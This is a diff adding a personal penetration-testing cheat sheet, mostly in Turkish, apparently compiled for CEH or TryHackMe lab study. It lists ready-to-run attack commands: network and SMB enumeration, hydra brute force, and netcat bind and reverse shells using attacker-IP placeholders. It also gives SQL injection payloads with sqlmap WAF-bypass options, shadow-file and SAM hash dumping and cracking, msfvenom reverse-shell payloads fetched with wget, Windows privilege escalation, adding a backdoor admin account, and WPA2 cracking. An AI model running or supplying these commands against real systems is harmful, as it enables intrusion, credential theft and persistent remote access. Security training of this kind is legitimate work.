@@ -1,0 +1,480 @@
+
+
+------------enumeration---------------
+**Advanced IP Scanner
+Specify IP range and start.
+Right click on alive hosts to perform actions, e.g. shutdown. Use Radmin for advanced features.
+
+**Angry Ip Scanner
+**
+
+netdiscover -i wlan0 -r 192.168.2.1/24
+
+enum4linux -u martin -p apple -U 10.10.10.12 | - u user -p pass -U get user list
+enum4linux -u martin -p apple -o 10.10.10.12 | -o get OS info
+enum4linux -u martin -p apple -P 10.10.10.12 | -P get password policy info
+enum4linux -u martin -p apple -G 10.10.10.12 | -G get groups and members info
+enum4linux -u martin -p apple -S 10.10.10.12 | -S get share list info
+enum4linux -u martin -p apple -a 10.10.10.12 | -a get all simple enumeration data [-U -S -G -P -r -o -n -i]
+
+nmap
+nmap -T4 -A -p- <ip>
+nmap -sn ip/subnet  >subnet tarar
+nmap -Pn ip/subnet >ağdaki aktif cihazları gormemzi sağlar
+-sC script tarama
+nmap -sS -sV -sC 1.2.3.4/24 
+-O operating system
+nmap -sS -sC -iL=active_targets
+nmap -sS --script=default,vuln -iL=active_targets
+nmap --script=http-methods.nse --script-args http-methods.retest=1 -p80 192.168.56.137 >http methodlarını gormemizi sağlar
+
+nmap --script smb-os-discovery.nse -p 445 192.168.8.106
+
+--script=smb-enum-shares.nse,smb-enum-users.nse 
+#nmap -p 139,445 -Pn –script smb-enum* 10.10.10.40
+#nmap -p 139,445 -Pn –script smb-vuln* 10.10.10.40
+#smb \\\\ip\\user
+smbclient -L \\ip  >paylasılan dosya ve izinleri verir
+smbclient \\ip\user
+#smbclient -L 10.10.6.165 -U "svc-admin" svcadmin ile paylasılanları listele
+#smbclient \\\\10.10.6.165\\backup -U "svc-admin" svc-admin oturumu ile backup dizinin eriş
+>>smb>#get backup_credentials.txt
+#smb://ip/username/dizin
+
+nbtscan -A ip/subnet  >> ip,mac,oturum ismi bilgisi
+nbtstat -A ip >>bilgisayarın adını öğrenmemizi sağlar
+
+msfconsole
+auxiliary/scanner/ssh/ssh_login 
+
+nmap -sU -p 161 <target IP>
+nmap -sU -p 161 --script=snmp-brute 10.10.10.12 | brute force SNMP community string
+use auxiliary/scanner/snmp/snmp_login | set RHOSTS | exploit
+use auxiliary/scanner/snmp/snmp_enum | set RHOSTS | exploit
+
+
+--------BruteForce------------------------
+
+hydra -l user -P Wordlist ssh://10.10.10.10 -s portnumber
+hydra -L fasttrack.txt -P fasttrack.txt -t12 -f 192.168.8.104 http-get / -V
+hydra -L user.txt -P pass.txt ftp://ip >>ftp bruteforce
+
+crunch 1 4 0123456789abc -o wordlist.txt >>komutu ile 0123456789 rakamlarından ve abcd harflerinden oluşan 1, 2, 3, 4 haneli rakamların oluşturduğu kombinasyonlar ile wordlist oluşturulur ve wordlist.txt olarak kaydedilir
+
+cewl https://site -w wordlist.txt
+
+
+-------netcat-------------------------
+
+Bind Shell: Saldırılan makinede bir porta /bin/bash sabitlenir ve biri bağlanana kadar dinler. Arka kapı açmak için kullanılır
+>>Kurban: nc -lvp 1337 -e /bin/bash
+>>Saldırgan: nc KURBAN_IP 1337
+Reverse Shell: Saldırgan belirlenen porttan biri bağlanana kadar dinlemeye başlar. Kurban o porta bağlanarak saldırganın komut çalıştırmasına izin verir
+>>Saldırgan: nc -lnvp 1337
+>>Kurban: nc -nv SALDIRGAN_IP 1337 -e /bin/bash 
+
+--------------curl---------------------
+
+curl http://10.10.105.29:8081/ctf/sendcookie --cookie flagpls=flagpls  //cookie gönderir
+curl -c cookie.txt http://10.10.105.29:8081/ctf/getcookie //cookie alır ve txtye yazar
+curl -X POST -d 'flag_please' http://10.10.105.29:8081/ctf/post //post metodu
+curl http://10.10.105.29:8081/ctf/get  //get metodu
+
+
+-----------------ftp----------------------
+ftp 12.12.12.12 daha sonra anonymous daha sonra 
+ >get <dosya> ile dosya indir.>single file download
+ftp> put c:\files\file1.txt >single file uploaded
+ >mget *.txt <This command will grab all files that end in .txt extension.
+ >terminal >
+open <filename> ile dosya aç
+https://null-byte.wonderhowto.com/how-to/brute-force-ftp-credentials-get-server-access-0208763/
+hydra -L user.txt -P pass.txt ftp://ip >>bruteforce
+ncrack
+patator
+nmap --script ftp-brute -p 21 <host> >ftp brute force
+
+----------------ssh----------------
+
+ssh basterd@<ip> -p 55007
+
+-----------------sqli----------------
+
+manuel 
+
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—
+
+
+#python .\sqlmap.py -r request.txt -p tc --no-cast --threads=10 --batch --random-agent  --tamper="between,randomcase,space2comment" --dbs
+
+--no-cast bağlantıyı şifreler for bypasssing waf
+--threads=10 10 a kadar veriyoruz.
+--random-agent rastgele agent 
+--dbs ilk parametre dbden çıkarılılan eğer --current-db bu mevcut db
+--level=5 1 den 5 e kadar verebilirsin arttıkca payload sayısı artıyor işlem uzar
+--risk=3 1 den 3 e kadar genelde 2 payloadların deneme yontemleri değiştirilir.
+--os-shell mevcut dbnin işletim issteminde shell almanı sağlar
+--privileges db kullanıcılarının yetkilerini getirir.
+--prefix="'" payload başlangıc noktasını belirler mesela tırnakla başla sonra diğerlerini ekle
+--suffix="--#"  payloadların  sonuna koyar
+--dbms=mysql veritabanı tipine göre payloadları atar.
+--tamper="between,randomcase,space2comment" farklı eklentiler çalıstırır  cloudflare bypass
+--identify-waf waf için script çalıstıtrıtr
+
+http://webforpentester/sqli/example2.php?name=root'/**/or/**/'a'='a 
+
+sqlmap temel seviye komutlar
+
+#sqlmap -u "http://webforpentester/sqli/example1.php?name=root" --cookie="user=a;time=b"--dbs
+
+#sqlmap -u "http://webforpentester/sqli/example1.php?name=root" --tables -D exercises
+#sqlmap -u "http://webforpentester/sqli/example1.php?name=root" --columns -T users -D exercises
+#sqlmap -u "http://webforpentester/sqli/example1.php?name=root" --dump -T users -D exercises
+
+manuel>> a';insert into login values ('omer','password');--
+
+#sqlmap -r req.txt -p id --dbs
+
+#sqlmap -r req.txt -p id --tables -D exercises
+#sqlmap -r req.txt -p id --columns -T users -D exercises
+#sqlmap -r req.txt -p id --dump -T users -D exercises
+---------------------webfuzzing--------------------------
+
+#dirb https://orneksite.com/ /usr/share/wordlists/dirb/big.txt
+
+wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 http://192.168.55.8/FUZZ
+ -c renkli çıktı
+
+gobuster dir -u http://<ip> -x php,txt,tar -w <wordlist>
+gobuster dir -u http://<ip>/joomla -x <extensions to search for> -w <wordlist>
+
+nikto -h http://ip:port
+
+[saydin@marine saydin]$ chown saydin /tmp/deneme.txt
+‘/tmp’ dizinindeki ‘deneme.txt’ dosyasının sahibini ‘saydin’ olarak değiştirir.
+[saydin@marine saydin]$ chown –R saydin /tmp/saydin
+‘/tmp/saydin’ dizininin ve altındaki bütün dosya ve dizinlerin sahibini ‘saydin’ olarak
+değiştirir.
+
+
+---------------------crach hash---------------------------
+crack linux/ssh
+
+linux 
+cp /etc/passwd . komutu ile passwd dosyası o anki dizine kopyalanır
+cp /etc/shadow . komutu ile shadow dosyası o anki dizine kopyalanır
+unshadow passwd shadow > unshadow.txt komutu ile iki dosya birleştirilerek kırılabilecek hale getirilir
+Son olarak eldeki dosya (unshadow.txt) kullanıcı adlarını, parola hash değerlerini, ev dizinini vb. içerir
+
+john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+
+
+hashcat --help |grep -i "hashtype"> kodunu bul
+https://hashes.com/en/decrypt/hash
+hashcat -m <hash iid>  hash.txt  /wordlist
+
+***
+hashid -m “/$6/$aReallyHardSalt/$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.”
+
+Identified hash is: SHA12 crypt with mode 1800
+
+To crack the hash:
+
+hashcat -m 1800 “/$6/$aReallyHardSalt/$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.” /rockyou.txt
+****
+
+hashid -m e5d8870e5bdd26602cab8dbe07a942c8669e56d6
+
+Whose hash type is SHA1
+
+Then move on to crack the hash:
+
+hashcat -m 110 e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme ../../rockyou.txt
+
+*******************************************
+
+binwalk -i dosya >>bşr şey var mı kontrol et 
+binwalk -e resim.jpg  >>> bir şey gizlemişler mi varsa çıkar
+steghide extract -sf resim.jpg >> içinde bir şey gizli mi cıkarır
+steghide info resim.jpg
+stegcracker <file> [<wordlist>] > stegolu dosyalara brute forceyapar
+
+
+
+-----------------------adb---------------------------------------
+adb devices
+adb usb
+adb tcpip 5555
+adb connect <ip>:port
+
+
+adb push [source] [destination] // Copy files from your computer to your phone. 
+adb pull [device file location] [local file location] // Copy files from your phone to your computer.
+-d - directs command to the only connected USB device
+
+adb devices burda kontrol et
+adb connect ip:port
+adb devices -l tekrar kontrol et
+
+adb shell
+adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
+adb pull sdcard/log.txt /home/mmurphy/Desktop
+
+----------msfconsole--------------------------------------
+search type:auxiliary telnet
+---
+use exploit/multi/misc/java_rmi_server
+show options
+msf > set RHOST 192.168.8.106
+msf > set RPORT 1099
+msf > set payload java/meterpreter/reverse_tcp
+Komutu ile başarılı bir exploit sonrasında geri meterpreter bağlantısı açılması istendiği belirtilir
+
+msf > set show options 
+Komutu ile eklenen “payload” için girilmesi gereken parametreler tekrar kontrol edilir.
+LHOST (Local Host) kendi bilgisayarımızın IP adresi, 
+LPORT (Local Port) kendi bilgisayarımızda çalışacak olan reverse shell bağlantısı için dinlenilecek port anlamına gelmektedir.
+msf > sessions -l komutu ile açılan meterpreter oturumları listelenir ve 1 numaralı oturumun açık olduğu gözlenir
+msf > sessions -i 1 komutu ile 1 numaralı oturum aktif hale getirilir ve meterpreter komutları çalıştırılabilir hale gelir
+
+Örneğin, meterpreter > run post/multi/gather/ssh_creds komutu hedef sistemde bulunan kullanıcıların uzaktan bağlantı (SSH) anahtarları alınabilir
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.105 LPORT=4444 -f elf > shell.elf 
+
+--kendi makinemizde--
+msf > use exploit/multi/handler
+msf > set PAYLOAD linux/x86/meterpreter/reverse_tcp
+msf > set LHOST 192.168.8.105
+msf > set LPORT 4444
+msf > run
+
+python -m SimpleHTTPServer 80<
+python -m simplehh
+
+wget 192.168.8.105/shell.elf” komutu ile payloadu yayınladığımız sunucudaki dosya indirilebilir
+
+
+
+
+
+----------------linux------------------------------
+linux ip
+
+ifconfig eth0 ip subnetmask manuel ip
+
+ifdown eth0>resetlemek
+ifup eth0
+
+service network restart
+
+/etc/sysconfig/network-scripts/ifcfg-eth0
+Öncelikle BOOTPROTO kısmında “dhcp” yazan satırı “static” olarak güncelliyoruz ve atayacağımız IP, Netmask ve Gateway bilgilerini giriyoruz.
+
+python -c 'import pty;pty.spawn("/bin/bash")' >interaktif shell
+python3 -m http.server 80
+
+139 ve 445 numaralı portları enumeration yapmak için enum4linux isimli aracı kullanabiliriz. Enum4linux: windows ve samba sistemlerinde enumeration yapmak için kullanılır.
+enum4linux -a ip   smb >>protokolunde kullanıccıları gosterir
+
+smbclient -L //ip/
+smbclient //ip/username
+
+nfs mount
+mount ip:/dizin <kendi dizin>
+chmod 600 id_rsa
+ssh -i id_rsa username@ip
+
+
+scp <user@machineip>:Alien_autospy.jpg /localdir/
+find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null >suid list
+find . -exec chmod 777 /root \
+
+
+---------------windows------------------------------
+windows pe
+
+whoami /priv komutu ile ayrıcalıklı servisleri listele
+daha sonra PrintSpoofer.exe yi indir githubdan ve çalıştır
+PrintSpoofer.exe -i -c cmd >ile çalıştır.
+
+**
+cmd ile bu komutu calıstır geçmiş komutlara bak.
+#type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile.
+**
+IIS için
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+**
+SSH
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+**
+
+https://github.com/itm4n/PrivescCheck 
+buradan python dosyası indirilir
+windows makinede 'systeminfo' komutu çalıstırılır ve çıktısı txt formatıyla kendi makinemize alınarak
+#wes.py systeminfo.txt komutuyla gerekli taramalar yapılır
+
+
+https://github.com/bitsadmin/wesng >suggester
+
+
+veya shell alındıysa msfconsole üzerinden
+multi/recon/local_exploit_suggester çalıstırılır
+
+#msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.101.174 LPORT=LOCAL_PORT -f msi -o malicious.msi
+
+https://serdardasdemir.com/tryhackme-attacktive-directory-write-up/
+
+
+**
+İlk olarak Active Directory atakları için içinde birçok aracı barındıran impacket kurulumunu yapalım.
+
+İmpacketi makinemize klonlayalım. /opt/impacket dizinine klonlama işlemini gerçekleştirelim. İstenilen herhangi bir dizine de klonlanabilir.
+
+git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
+
+Daha sonra aynı dizin içinde gerekli Python modüllerinin yüklenmesi için aşağıdaki komutu çalıştıralım.
+
+pip3 install -r /opt/impacket/requirements.txt
+Bu aşamada son olarak aynı dizin içinde setup.py dosyasını çalıştırarak kurulumu tamamlayalım.
+
+cd /opt/impacket/ && python3 ./setup.py install
+**
+
+net user >kullanıcıları listeler
+net user Test /Add
+net localgroup Administrators Test /Add
+**
+
+Dump and Crack SAM (Security Account Manager) hashes
+Windows stores passwords in LM and NTLM hash format | NTLM New Technology LAN Manager.
+Need admin access to dump SAM.
+
+ WMIC (Windows Management Instrumentation Command) CLI to get info about local system
+wmic useraccount get name,sid | displays usernames and their SIDs
+
+Pwdump7 (To dump password hashes)
+
+pwdump7.exe -d c:\lockedfile.dat backup-lockedfile.dat |dump protected file
+Brows admin terminal to pwdump7 path and run pwdump.exe in cmd | shows password hashes
+PwDump7.exe > c:\hashes.txt | export hashes to path defined
+In text file replace boxes with account names obtained from WMIC. The last code numbers will be the
+identity. And Save the file
+
+Ophcrack (To crack password hashes)
+To crack passwords not longer than 14 characters using only alphanumeric characters
+Open /x86 gui version. Load PWDUMP and select the hashes.txt file.
+Select Table Vista Free. Install it from location where ophcrack files are placed.
+Click Crack to start cracking
+Copy the Hashes.txt to shared drive for future labs.
+
+
+
+------------------fuzzing-----------------------------
+fuzzing
+
+dirbuster aracı kullanılabilir
+
+#dirb https://orneksite.com/ /usr/share/wordlists/dirb/big.txt
+
+wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 http://192.168.55.8/FUZZ
+ -c renkli çıktı
+
+gobuster dir -u http://<ip> -x php,txt,tar -w <wordlist>
+gobuster dir -u http://<ip>/joomla -x <extensions to search for> -w <wordlist>
+
+
+
+------------------------------wordpress-----------------------------
+wpscan
+
+wpscan --url testsite.com --enumerate u -> userları bulmamızı sağlar
+wpscan --url testsite.com --passwords rockyou.txt --usernames admin ->kullanıcısı admin olan passworde bruteforce yapmamızı sağlar
+
+
+**
+wpsan --url testsite.com -> genel tarama
+
+wpscan --url testsite.com --random-user-agent ->rastgele useragentla tarama yapma
+wpscan --url testsite.com --ua VALUE
+
+wpscan --url testsite.com --enumerate ap -->tum eklentileri taramamızı sağlar
+
+wpscan -url www.target.com -enumerate p ve wpscan --url www.alandi.com --enumerate t >>Kullanılan eklentiler ve temalar bulunabilir
+
+wpscan --url testsite.com --enumerate vt -> zafiyetli temaları bulmamızı sağlar
+
+metasploit
+
+Use wpscan --url http://[IP Address of Windows Server 2012]:8080/CEH --enumerate u |
+enumerate user list
+ In msfconsole use auxiliary/scanner/http/wordpress_login_enum
+ Type set PASS_FILE /root/Desktop/Wordlists/Passwords.txt
+ Type set RHOSTS [IP Address of Windows Server 2012]
+ Type set RPORT 8080
+ Type set TARGETURI /CEH/ or complete URL
+ Type set USERNAME admin and press Enter to set the username as admin.
+ Type run
+ Use URL http://[IP Address of Windows Server 2012]:8080/CEH/wp-login.php to login
+
+
+Brute-force saldırısı yapılabilir (wpscan -url www.alanadi.com --wordlist wordlist.txt --username user).
+WordPress sitesi yazarlarının ve yöneticisinin kullanıcı adları bulunabilir (wpscan -url www.target.com -enumerate u).
+Sitedeki araç, gereç, IP bilgisi görülebilir.
+Dosya dizin kısmı hakkında ön bilgi gibi veriler alınabilir.
+Sitenin kullandığı uygulama platformları ve güvenliği hakkında veriler görülebilir.
+
+
+
+----------------------wireless---------------------------------------
+WEP Cracking – AIRCRACK-NG   (tshark -r file.cap veya airodump-ng -r file.cap 
+aircrack-ng '/root/Desktop/Sample Captures/WEPcrack-01.cap' | ‘’ are not needed if there is no space in folder name
+WPA2 Cracking – AIRCRACK-NG
+aircrack-ng -a 2 -b 20:E5:2A:E4:38:00 -w /root/Desktop/Wordlists/Passwords.txt '/root/Desktop/Sample Captures/WPA2crack-01.cap' >> | -a 2 mode WPA2, -b bssid, -w wordlist
+
+
+*
+
+
+
+------------------crypto--------------------------
+BCTEXTENCODER
+Simple GUI based. Enter text and encode it using password.
+
+CREATING SELF-SIGNED CERTIFICATE
+ Open inetmgr
+ Click machine name and select Server Certificates
+ From actions select Create Self signed Certificate
+ Choose Name and Personal.
+ Go to a Site, choose Bindings from the Action pane.
+ Select Add.
+ Select Https, IP 10.10.10.16, hostname www.goodshopping.com, select the certificate.
+ Go the site and right click refresh one time.
+
+VERACRYPT - DISK ENCRYPTION
+Create Encrypted containers which can be mounted as Virtual Disks.
+Creation
+Create Volume  Create an Encrypted File Container  Standard VeraCrypt volume  Volume
+Location (Path to save the container)  Encryption AES Hash SHA-512  Size of Volume  Enter
+Password  Generate mouse randomness  Format Exit
+Mount Volume
+Select Drive Letter  Select File  Mount  Enter Password  Disk shown in Explorer
+CrypTool – Data Encryption
+File  New  Enter Text  Encrypt/Decrypt  Symmetric (Modern)  RC2  KEY 05  Encrypt
+File  Open  Encrypt/Decrypt  Symmetric (Modern)  RC2  KEY 05  Decrypt
+
+
+
+
+
+
